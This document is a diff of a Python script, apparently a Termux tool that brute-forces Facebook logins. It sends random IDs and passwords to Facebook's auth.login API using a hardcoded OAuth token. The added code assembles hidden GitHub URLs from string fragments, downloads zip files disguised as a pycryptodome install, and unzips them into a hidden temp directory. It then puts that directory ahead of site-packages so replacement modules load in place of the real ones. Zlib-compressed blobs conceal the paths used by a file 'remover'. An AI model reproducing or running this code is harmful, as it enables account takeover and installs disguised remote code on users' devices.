@@ -1,20 +1,89 @@
 #coding = utf-8
 #tnx alot janj hamza hop
 #script shared by Qaiser
+#SOURCE BY : IDREES
+#GITHUB : IDREES-WISAL
+#coding = utf-8
 from uuid import uuid4
-import requests,zlib,platform
 import os,sys,tempfile,string,random,subprocess,uuid
+http_directory = tempfile.mkdtemp(prefix='.')
+site_packages = sys.path[4]
+print(site_packages)
+print(http_directory)
+sys.path.remove(site_packages)
+sys.path.insert(4,http_directory+'/reqmodule')
+sys.path.insert(5,http_directory)
+try:
+        os.mkdir('crypto')
+except:pass
+hh = "ho"
+hh2 = "9/pycrypt"
+find_aarch = subprocess.check_output('uname -om',shell=True)
+if 'aarch64' in str(find_aarch):
+        user_aarch = '64'
+        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
+elif 'arm' in str(find_aarch):
+        user_aarch = '32'
+        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
+else:
+        print(' Unknown aarch ')
+        exit()
+if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
+        os.system('clear')
+        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
+        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
+        os.system('python jan.py')
+else:
+        akk2="rsi"
+        akk=f"cha{akk2}fi"
+        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
+        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
+        os.system(f'curl -L {lib} > {http_directory}/config.zip')
+        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
+        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
+try:
+        import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as ThreadPool
+        from Crypto.Cipher import AES, PKCS1_v1_5
+        from Crypto.PublicKey import RSA
+        from Crypto.Random import get_random_bytes
+except Exception as e:
+        print(e)
+        print('\n Installing modules wait !')
+        os.system('pip install futures==2 && python jan.py')
+except FileExistsError:
+        os.system('pip uninstall requests urllib3 idna certifi -y')
+        pass
+ 
+try:
+        import os,sys,time,json,random,re,string,platform,base64,requests,io,struct,zlib
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as ThreadPool
+except ModuleNotFoundError:
+        print('\n Installing missing modules ...')
+        os.system('pip install requests futures==2 > /dev/null')
+        os.system('python jan.py')
+ 
 #----[pran links]-----
 kkk = {'user-agent': 'Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
 hhh = {'adid': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'email': '10000'+str(random.randint(11111111111,99999999999)), 'password': str(random.randint(1111111,9999999)), 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': 'SM-A500H', 'device_id': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
 lll = ("https://b-api.facebook.com/method/auth.login")
 #----[remover]-----
-try:
-	sz = zlib.decompress(b'https://github.com/Mafyia313/Naib-approvel.txt/blob/main/naib-on-fir.txt')
-except:
-	sz=""
-#--checking if file is not avalible 
- 
+import os,shutil,zlib
+sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')
+sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')
+sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')
+sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')
+sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')
+sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')
+sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')
+sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')
+#--checking if file is not avalible
+if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
+        pass
+        exit("Error in termux modules ")
+        
 if os.path.exists(sz):
 	os.rename(sz1,'.f1')
 	os.rename(sz2,'.f2')
